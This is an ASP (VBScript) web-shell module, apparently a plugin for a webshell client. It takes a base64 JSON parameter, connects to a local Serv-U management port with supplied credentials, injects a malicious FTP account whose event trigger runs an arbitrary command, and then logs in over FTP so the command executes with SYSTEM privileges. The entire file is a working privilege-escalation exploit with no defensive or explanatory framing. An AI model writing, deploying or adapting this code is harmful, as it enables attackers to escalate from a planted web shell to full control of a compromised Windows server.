<%

On Error Resume Next

Function fnBase64Decode(byVal strIn)
    Dim objXML, objNode
    Set objXML = CreateObject("MSXML2.DOMDocument.3.0")
    Set objNode = objXML.createElement("b64")
    objNode.dataType = "bin.base64"
    objNode.text = strIn
    
    Dim objStream
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' adTypeBinary
    objStream.Open
    objStream.Write objNode.nodeTypedValue
    objStream.Position = 0
    objStream.Type = 2 ' adTypeText
    objStream.CharSet = "utf-8"
    fnBase64Decode = objStream.ReadText
    Set objStream = Nothing: Set objNode = Nothing: Set objXML = Nothing
End Function

Function fnExtractJsonValue(json, key)
    Dim regEx, matches
    Set regEx = New RegExp
    regEx.Pattern = """" & key & """\s*:\s*""?([^"",}]+)""?"
    regEx.IgnoreCase = True
    If regEx.Test(json) Then
        Set matches = regEx.Execute(json)
        fnExtractJsonValue = Trim(matches(0).SubMatches(0))
    Else
        fnExtractJsonValue = ""
    End If
End Function

Sub Main()
    Dim szZ1Base64, szJson, szHost, szPort, szUser, szPass, szCmd
    szZ1Base64 = Request.Form("z1")
    
    If szZ1Base64 = "" Then
        Response.Write "[-] ERROR: Missing parameter matrix [z1]."
        Exit Sub
    End If
    
    szJson = fnBase64Decode(szZ1Base64)
    szHost = fnExtractJsonValue(szJson, "ip")
    szPort = fnExtractJsonValue(szJson, "port")
    szUser = fnExtractJsonValue(szJson, "user")
    szPass = fnExtractJsonValue(szJson, "pass")
    szCmd  = fnExtractJsonValue(szJson, "cmd")
    
    If szHost = "" Then szHost = "127.0.0.1"
    If szPort = "" Then szPort = "43958"
    
    Response.Write "[+] Successfully aligned parameters. Target Serv-U LocalPort: " & szPort & vbCrLf

    Dim objSocket
    Set objSocket = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    
    objSocket.setTimeouts 5000, 5000, 5000, 5000
    
    Dim szTargetUrl
    szTargetUrl = "http://" & szHost & ":" & szPort & "/"
    
    Dim sbPayload
    sbPayload = "USER " & szUser & vbCrLf & _
                "PASS " & szPass & vbCrLf & _
                "SUSER " & szUser & "|" & szPass & "|Y|N" & vbCrLf & _
                "SEVENT " & szUser & "|0|0|" & szCmd & vbCrLf
                
    objSocket.open "POST", szTargetUrl, False
    objSocket.send sbPayload
    
    If Err.Number <> 0 Then
        Response.Write "[-] Failed to connect to Serv-U management port. Service stopped or access denied." & vbCrLf
        Err.Clear
        Exit Sub
    End If
    
    Response.Write "[+] Successfully authenticated and injected Malicious FTP Account & Event trigger into Serv-U memory!" & vbCrLf
    Response.Write "[+] Attempting to log into standard FTP port 21 to fire the SYSTEM payload..." & vbCrLf
    
    Dim objFtpTrigger, szFtpUrl
    Set objFtpTrigger = CreateObject("MSXML2.XMLHTTP")
    
    szFtpUrl = "ftp://" & szUser & ":" & szPass & "@127.0.0.1:21/trigger.txt"
    
    objFtpTrigger.open "GET", szFtpUrl, False
    objFtpTrigger.send
    
    If Err.Number <> 0 Then
        Err.Clear
    End If
    
    Response.Write "[+] Payload triggered successfully! Check if your cmd executed with SYSTEM authority." & vbCrLf
    
    Set objFtpTrigger = Nothing
    Set objSocket = Nothing
End Sub

Call Main()

%>